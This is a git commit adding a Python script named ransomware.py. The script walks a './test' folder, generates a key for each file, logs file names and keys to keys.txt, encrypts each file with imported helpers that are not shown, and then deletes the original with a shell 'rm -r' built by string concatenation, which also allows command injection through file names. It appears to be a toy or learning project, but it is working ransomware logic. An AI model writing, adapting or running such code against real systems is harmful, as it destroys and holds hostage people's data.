64a2e387841952ec2a20e7d8f50763ee3a3bed5b
K0ala <92472219+K0ala-py@users.noreply.github.com>
2022-12-11 05:39:40 -0500

    Add files via upload

---
+++ ransomware.py
@@ -0,0 +1,20 @@
+import os
+from key_gen import key_gen
+from encrypt import enc_process
+
+def main():
+    for (path,dirs,files) in os.walk('./test',topdown=True):
+            for file in files:
+                #if file[-3:] == 'txt':
+                if True:
+                    file = path+'/'+file
+                    key_gen()                                       # generate the key
+                    with open('mykey.key','r') as key_book:         # open file with key generated
+                        key = key_book.read()                       # save key generated into the "key" variable
+                        with open('keys.txt','a') as keys_file:     # open file 'keys.txt' and save "KEY" and "name FILE"
+                            keys_file.write('\nFILE: '+file)
+                            keys_file.write('\nKEYPASSWORD: '+ key)
+                    enc_process(file)                               # encrypt process!
+                    os.system('rm -r '+file)
+
+main()
